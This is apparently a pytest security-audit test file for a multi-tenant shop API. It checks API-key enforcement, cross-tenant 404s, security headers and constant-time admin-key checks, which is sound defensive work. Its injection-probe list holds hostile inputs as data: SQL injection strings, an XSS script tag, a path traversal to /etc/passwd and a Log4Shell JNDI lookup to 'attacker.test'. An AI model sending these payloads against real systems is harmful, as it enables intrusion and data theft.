"""Sprint 3.2 Security-Audit — parametric coverage matrix.

Three parametric test classes:
  1. AUTH_REQUIRED — every shop-key-protected endpoint rejects missing/short/wrong keys.
  2. CROSS_TENANT — every shop-scoped resource endpoint returns 404 for other shops.
  3. INJECTION_PROBES — header/body injection attempts don't crash or leak.

The intent is wide coverage, not deep specificity. Per-endpoint behavioural
tests live in their own files. This file is the safety net catching new
endpoints that forgot auth or tenant scoping.
"""
from __future__ import annotations

from typing import Any

import pytest
from httpx import AsyncClient

from backend.tests.conftest import TEST_ADMIN_KEY

pytestmark = pytest.mark.integration


async def _new_shop(client: AsyncClient, domain: str) -> dict[str, Any]:
    resp = await client.post(
        "/v1/shops",
        json={"domain": domain},
        headers={"X-Admin-Key": TEST_ADMIN_KEY},
    )
    assert resp.status_code == 201, resp.text
    body: dict[str, Any] = resp.json()
    return body


# ---------------------------------------------------------------------------
# 1. AUTH_REQUIRED — every endpoint that needs X-Api-Key MUST 401 without it.
# ---------------------------------------------------------------------------

# (method, path, body_json, idempotent)
AUTH_PROTECTED: list[tuple[str, str, dict[str, Any] | None]] = [
    ("GET",  "/v1/shops/me", None),
    ("GET",  "/v1/shops/me/export", None),
    ("POST", "/v1/conversations", {"initial_message": "hi"}),
    ("GET",  "/v1/conversations/00000000-0000-0000-0000-000000000000", None),
    ("POST", "/v1/conversations/00000000-0000-0000-0000-000000000000/messages",
             {"content": "x"}),
    ("POST", "/v1/conversations/00000000-0000-0000-0000-000000000000/conversion",
             {"order_id": "x", "order_total_eur": "1.00", "currency": "EUR"}),
    ("POST", "/v1/products", {"external_id": "x", "name": "x", "stock_status": "instock"}),
    ("POST", "/v1/products/sync", {"products": []}),
    ("GET",  "/v1/products/sync/00000000-0000-0000-0000-000000000000", None),
    ("POST", "/v1/billing/checkout", {"plan": "starter"}),
    ("POST", "/v1/billing/portal", None),
    ("GET",  "/v1/billing/quota", None),
    ("GET",  "/v1/analytics/overview", None),
]


@pytest.mark.parametrize(("method", "path", "body"), AUTH_PROTECTED)
async def test_endpoint_requires_api_key(
    integration_client: AsyncClient,
    method: str,
    path: str,
    body: dict[str, Any] | None,
) -> None:
    """No X-Api-Key → 401 (or 422 for clearly-malformed bodies)."""
    resp = await integration_client.request(method, path, json=body)
    assert resp.status_code == 401, f"{method} {path} returned {resp.status_code}"


@pytest.mark.parametrize(("method", "path", "body"), AUTH_PROTECTED)
async def test_endpoint_rejects_short_api_key(
    integration_client: AsyncClient,
    method: str,
    path: str,
    body: dict[str, Any] | None,
) -> None:
    """Sub-8-char keys are short-circuited before DB lookup → 401."""
    resp = await integration_client.request(
        method, path, json=body, headers={"X-Api-Key": "abc"}
    )
    assert resp.status_code == 401


@pytest.mark.parametrize(("method", "path", "body"), AUTH_PROTECTED)
async def test_endpoint_rejects_wrong_api_key(
    integration_client: AsyncClient,
    method: str,
    path: str,
    body: dict[str, Any] | None,
) -> None:
    """Plausible-but-wrong keys (>=8 chars) → 401, no info leak in body."""
    bogus = "wrong-but-long-enough-key-string"
    resp = await integration_client.request(
        method, path, json=body, headers={"X-Api-Key": bogus}
    )
    assert resp.status_code == 401
    detail = resp.json().get("detail", "")
    # Generic message — must not reveal which prefix (if any) matched.
    assert isinstance(detail, str) and "invalid" in detail.lower()


# ---------------------------------------------------------------------------
# 2. CROSS_TENANT — every resource that takes a path-id must 404 for outsiders.
# ---------------------------------------------------------------------------


async def test_cross_tenant_conversation_read_returns_404(
    integration_client: AsyncClient,
) -> None:
    a = await _new_shop(integration_client, "ct-conv-a.example.com")
    b = await _new_shop(integration_client, "ct-conv-b.example.com")
    create = await integration_client.post(
        "/v1/conversations",
        json={"initial_message": "secret"},
        headers={"X-Api-Key": a["api_key"]},
    )
    cid = create.json()["conversation"]["id"]
    leak = await integration_client.get(
        f"/v1/conversations/{cid}", headers={"X-Api-Key": b["api_key"]}
    )
    assert leak.status_code == 404


async def test_cross_tenant_message_append_returns_404(
    integration_client: AsyncClient,
) -> None:
    a = await _new_shop(integration_client, "ct-msg-a.example.com")
    b = await _new_shop(integration_client, "ct-msg-b.example.com")
    create = await integration_client.post(
        "/v1/conversations",
        json={"initial_message": "hi"},
        headers={"X-Api-Key": a["api_key"]},
    )
    cid = create.json()["conversation"]["id"]
    leak = await integration_client.post(
        f"/v1/conversations/{cid}/messages",
        json={"content": "should fail"},
        headers={"X-Api-Key": b["api_key"]},
    )
    assert leak.status_code == 404


async def test_cross_tenant_conversion_returns_404(
    integration_client: AsyncClient,
) -> None:
    a = await _new_shop(integration_client, "ct-conversion-a.example.com")
    b = await _new_shop(integration_client, "ct-conversion-b.example.com")
    create = await integration_client.post(
        "/v1/conversations",
        json={"initial_message": "hi"},
        headers={"X-Api-Key": a["api_key"]},
    )
    cid = create.json()["conversation"]["id"]
    leak = await integration_client.post(
        f"/v1/conversations/{cid}/conversion",
        json={"order_id": "x", "order_total_eur": "1", "currency": "EUR"},
        headers={"X-Api-Key": b["api_key"]},
    )
    assert leak.status_code == 404


async def test_cross_tenant_sync_status_returns_404(
    integration_client: AsyncClient,
) -> None:
    a = await _new_shop(integration_client, "ct-sync-a.example.com")
    b = await _new_shop(integration_client, "ct-sync-b.example.com")
    start = await integration_client.post(
        "/v1/products/sync",
        json={"products": [{
            "external_id": "x", "name": "x", "stock_status": "instock",
        }]},
        headers={"X-Api-Key": a["api_key"]},
    )
    job_id = start.json()["job_id"]
    leak = await integration_client.get(
        f"/v1/products/sync/{job_id}", headers={"X-Api-Key": b["api_key"]}
    )
    assert leak.status_code == 404


# ---------------------------------------------------------------------------
# 3. INJECTION_PROBES — best-effort SQL/XSS/header probes shouldn't crash.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "probe",
    [
        "'; DROP TABLE shops; --",
        "1' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../../etc/passwd",
        "${jndi:ldap://attacker.test/x}",
        "a" * 10_000,  # extremely long
    ],
)
async def test_injection_probes_in_api_key_dont_crash(
    integration_client: AsyncClient,
    probe: str,
) -> None:
    """All injection probes in the auth header → clean 401, never 500."""
    resp = await integration_client.get(
        "/v1/shops/me", headers={"X-Api-Key": probe}
    )
    assert resp.status_code == 401
    assert "DROP" not in resp.text  # no echo back of payload


async def test_xss_in_shop_domain_is_stored_as_text_not_executed(
    integration_client: AsyncClient,
) -> None:
    """Shop creation accepts the field but it's stored verbatim and never rendered as HTML."""
    payload = {"domain": "<script>alert(1)</script>.example.com"}
    resp = await integration_client.post(
        "/v1/shops",
        json=payload,
        headers={"X-Admin-Key": TEST_ADMIN_KEY},
    )
    # Pydantic doesn't reject by default; we don't render HTML; check storage round-trip.
    assert resp.status_code in {201, 422}
    if resp.status_code == 201:
        body = resp.json()
        # /me round-trip must echo the literal string — never decoded/executed.
        me = await integration_client.get(
            "/v1/shops/me", headers={"X-Api-Key": body["api_key"]}
        )
        assert me.json()["domain"] == payload["domain"]


async def test_negative_path_id_does_not_crash(
    integration_client: AsyncClient,
) -> None:
    shop = await _new_shop(integration_client, "neg-id.example.com")
    # FastAPI's UUID path validator handles this — must be 422 not 500.
    resp = await integration_client.get(
        "/v1/conversations/not-a-uuid", headers={"X-Api-Key": shop["api_key"]}
    )
    assert resp.status_code == 422


# ---------------------------------------------------------------------------
# 4. SECURITY HEADERS
# ---------------------------------------------------------------------------


async def test_security_headers_present_on_health(integration_client: AsyncClient) -> None:
    resp = await integration_client.get("/health")
    assert resp.headers.get("X-Frame-Options") == "DENY"
    assert resp.headers.get("X-Content-Type-Options") == "nosniff"
    assert "Content-Security-Policy" in resp.headers
    assert "Permissions-Policy" in resp.headers


# ---------------------------------------------------------------------------
# 5. ADMIN-KEY constant-time guard
# ---------------------------------------------------------------------------


async def test_admin_endpoint_rejects_short_admin_key(
    integration_client: AsyncClient,
) -> None:
    resp = await integration_client.post(
        "/v1/shops",
        json={"domain": "x.example.com"},
        headers={"X-Admin-Key": "x"},
    )
    assert resp.status_code == 401


async def test_admin_endpoint_rejects_admin_prefix_match(
    integration_client: AsyncClient,
) -> None:
    """Constant-time compare must not accept a string that's only a prefix."""
    if len(TEST_ADMIN_KEY) < 4:
        pytest.skip("test admin key too short for prefix probe")
    prefix = TEST_ADMIN_KEY[:-1]
    resp = await integration_client.post(
        "/v1/shops",
        json={"domain": "y.example.com"},
        headers={"X-Admin-Key": prefix},
    )
    assert resp.status_code == 401
